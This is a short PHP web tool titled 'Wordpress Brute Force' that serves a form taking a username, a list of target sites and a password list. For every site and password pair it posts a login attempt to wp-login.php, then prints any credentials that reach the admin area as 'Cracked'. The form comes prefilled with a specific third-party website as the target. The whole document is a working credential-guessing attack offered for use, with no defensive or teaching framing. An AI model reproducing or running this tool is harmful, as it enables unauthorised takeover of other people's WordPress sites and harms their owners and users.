<?
/*
 
*/
echo "<body text='#FFFFFF' bgcolor='#000000'>
<title>Wordpress Brute Force</title>
<form method='POST'>
<center>
<font face='Tahoma' size='2'>[#] WordPreSS Brute Force [#] </font>
<p>
<input type='text' name='username' value='admin'>
<input type='submit' name='start' value='Brute'>
<br>
<textarea cols='30' rows='10' name='websites'>http://www.jhonlinmagz.com/</textarea>
<textarea cols='30' rows='10' name='password'>123123</textarea></p>
<p><font face='Verdana' size='1'>[+] ReSulT [+]</font></p>
<style>
input {
background: black;
color: white;
border: dashed 1pt;
}
textarea {
background: black;
color: white;
border: dashed 1pt;
}
</style>";
$username = $_POST['username'];
$websites = explode("\n",$_POST['websites']);
$password = explode("\n",$_POST['password']);

function brute($webs,$username,$pass) {
$curl = curl_init();
curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
curl_setopt($curl,CURLOPT_FOLLOWLOCATION,1);
curl_setopt($curl,CURLOPT_COOKIEJAR,"cookie.txt");
curl_setopt($curl,CURLOPT_COOKIEFILE,"cookie.txt");
curl_setopt($curl,CURLOPT_URL,"$webs/wp-login.php");
curl_setopt($curl,CURLOPT_POSTFIELDS,"log=$username&pwd=$pass&wp-submit=Log+In&redirect_to=.$webs./wp-admin/&testcookie=1");
$brute = curl_exec($curl);
if(eregi('upload.php',$brute)) {
echo "<p><font face='Verdana' size='1'>[+] Cracked : <font color='#008000'>$username</font>:<font color='#008000'>$pass</font>@<font color='#008000'>$webs</font> [+]</font></p>";
}
}
foreach($websites as $webs) {
foreach($password as $pass) {
brute($webs,$username,$pass);
} }
echo "<p><font face='Verdana' size='1'>
+------------------------------------------------------------------------------------------------------------+</font></p>
</form>";
?>